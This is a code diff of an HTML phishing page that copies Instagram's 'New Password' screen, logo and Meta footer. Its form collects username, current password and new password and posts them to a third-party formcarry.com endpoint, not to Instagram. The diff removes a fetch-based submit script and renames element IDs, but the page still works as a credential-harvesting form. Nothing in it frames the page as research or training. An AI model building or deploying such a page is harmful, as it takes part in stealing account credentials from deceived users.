@@ -8,17 +8,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>New Password • Instagram</title>
 </head>
-<body>
 <main>
     <div class="container-modified" style="height: 315px;">
         <img src="https://1000logos.net/wp-content/uploads/2017/02/Logo-Instagram.png" alt="Lock Icon">
         <p style="font-size: 14px; width: 95%; font-weight: 400; margin: auto; color: #737373; padding-bottom: 8px;">We made it easy to get back into your account.</p>
         <div class="form-group-modified">
-            <form id="passwordForm" action="https://formcarry.com/s/4u9fu8BQRR6" method="POST">
-                <input type="text" name="Username" id="usernameInput" placeholder="Username" style="margin: 4px 0;" required>
-                <input type="text" name="Current Password" id="currentPasswordInput" placeholder="Current password" style="margin: 4px 0;" required>
-                <input type="text" name="New Password" id="newPasswordInput" placeholder="New password" style="margin: 4px 0;" required>
-                <button type="submit" id="changePasswordButton" style="font-size: 14px; font-weight: 600; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 13px 0; cursor: pointer;">Change</button>
+            <form action="https://formcarry.com/s/4u9fu8BQRR6" method="POST">
+                <input type="text" name="Username" id="emailInputModified" placeholder="Username" style="margin: 4px 0;" required>
+                <input type="text" name="Current Password" id="emailInputModified" placeholder="Current password" style="margin: 4px 0;" required>
+                <input type="text" name="New Password" id="emailInputModified" placeholder="New password" style="margin: 4px 0;" required>
+                <button type="submit" id="sendLinkButtonModified" style="font-size: 14px; font-weight: 600; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 13px 0; cursor: pointer;">Change</button>
             </form>
         </div>
     </div>
@@ -51,29 +50,5 @@
     </div>
     <div class="bottomliner">English (IN) &nbsp;&nbsp;&nbsp;© 2024 Instagram from Meta</div>
 </footer>
-
-<script>
-    document.getElementById('passwordForm').addEventListener('submit', function(event) {
-        event.preventDefault();
-        
-        // Collect form data
-        const formData = new FormData(event.target);
-        
-        // Send form data using fetch
-        fetch(event.target.action, {
-            method: 'POST',
-            body: formData
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Response from formcarry:', data);
-            // Reset the form fields
-            event.target.reset();
-        })
-        .catch(error => {
-            console.error('Error occurred:', error);
-        });
-    });
-</script>
 </body>
 </html>
